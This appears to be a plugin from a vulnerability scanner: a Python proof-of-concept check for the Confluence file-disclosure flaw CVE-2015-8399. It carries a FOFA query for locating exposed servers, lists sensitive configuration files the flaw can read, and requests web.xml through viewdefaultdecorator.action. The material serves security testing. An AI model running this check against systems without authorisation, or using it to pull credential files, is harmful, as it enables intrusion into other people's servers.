#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    '''
    fofa:  "confluence" && port=8090
    '''
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.CONFLUENCE
        self.name = 'CVE-2015-8399'
        self.keyword = ['confluence']
        self.info = 'CVE-2015-8399'
        self.type = VUL_TYPE.RCE
        self.level = VUL_LEVEL.HIGH
        self.refer = 'https://www.exploit-db.com/exploits/39170/'
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            '''
            /WEB-INF/decorators.xml
            /WEB-INF/glue-config.xml
            /WEB-INF/server-config.wsdd
            /WEB-INF/sitemesh.xml
            /WEB-INF/urlrewrite.xml
            /WEB-INF/web.xml
            /databaseSubsystemContext.xml
            /securityContext.xml
            /services/statusServiceContext.xml
            com/atlassian/confluence/security/SpacePermission.hbm.xml
            com/atlassian/confluence/user/OSUUser.hbm.xml
            com/atlassian/confluence/security/ContentPermissionSet.hbm.xml
            com/atlassian/confluence/user/ConfluenceUser.hbm.xml
            '''
            urls = [
                'admin/viewdefaultdecorator.action?decoratorName=/WEB-INF/web.xml',
                'spaces/viewdefaultdecorator.action?decoratorName=/WEB-INF/web.xml',
            ]
            async with ClientSession() as session:
                for url in urls:
                    url = self.base_url + url
                    async with session.get(url=url) as response:
                        if response != None:
                            text = await response.text()
                            if response.status == 200 and "<web-app" in text:
                                self.flag = 1
                                self.res.append({"info": url, "key": 'CVE-2015-8399'})
